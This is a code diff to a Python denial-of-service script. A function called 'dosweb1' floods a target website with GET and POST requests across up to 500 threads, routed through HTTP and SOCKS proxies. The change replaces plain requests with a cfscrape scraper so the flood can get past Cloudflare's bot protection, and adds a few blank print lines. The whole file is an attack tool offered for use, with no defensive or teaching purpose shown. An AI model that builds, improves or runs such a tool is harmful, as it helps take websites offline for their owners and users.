@@ -4,6 +4,9 @@ import random
 import requests
 import socket
 import os
+import cfscrape
+
+s = cfscrape.create_scraper()
 
 os.system("clear")
 
@@ -40,10 +43,10 @@ def dosweb1(target):
             'https': f'socks5://{proxyagentsocks}'
         }
         try:
-            requests.get(target, headers=header, proxies=proxieshttp)
-            requests.post(target, headers=header, proxies=proxieshttp)
-            requests.get(target, headers=header2, proxies=proxiessocks)
-            requests.post(target, headers=header2, proxies=proxiessocks)
+            s.get(target, headers=header, proxies=proxieshttp)
+            s.post(target, headers=header, proxies=proxieshttp)
+            s.get(target, headers=header2, proxies=proxiessocks)
+            s.post(target, headers=header2, proxies=proxiessocks)
         except:
             pass
 
@@ -86,6 +89,7 @@ if vibor == 1:
 
     try:
         threads = int(input("Threads[max 500]: "))
+        print("")
     except ValueError:
         exit(colorama.Fore.RED + "Threads count is incorrect!")
 
@@ -117,6 +121,7 @@ else:
         exit(colorama.Fore.RED + "Invalid domain")
 
     proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
+    print("")
 
     print(colorama.Fore.YELLOW + "Starting threads")
     if proxyuseage == 1:
